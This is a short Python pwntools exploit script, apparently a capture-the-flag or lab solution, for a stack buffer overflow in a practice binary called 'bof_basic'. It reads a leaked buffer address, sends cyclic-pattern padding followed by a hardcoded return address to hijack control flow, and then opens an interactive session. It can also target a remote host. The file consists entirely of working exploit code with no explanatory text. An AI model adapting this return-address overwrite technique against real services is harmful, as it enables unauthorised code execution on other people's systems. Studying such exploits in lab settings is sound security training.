from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    proc.recvuntil('buffer address: ')
    overflowme_adr = int(proc.recvline(), 16)
    print hex(overflowme_adr)
    raw_input('wait')
    buf = 'A' * cyclic_find('naab')
    buf += p64(0x0000000000400630)
    proc.sendline(buf)


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc localhost port'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./bof_basic'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
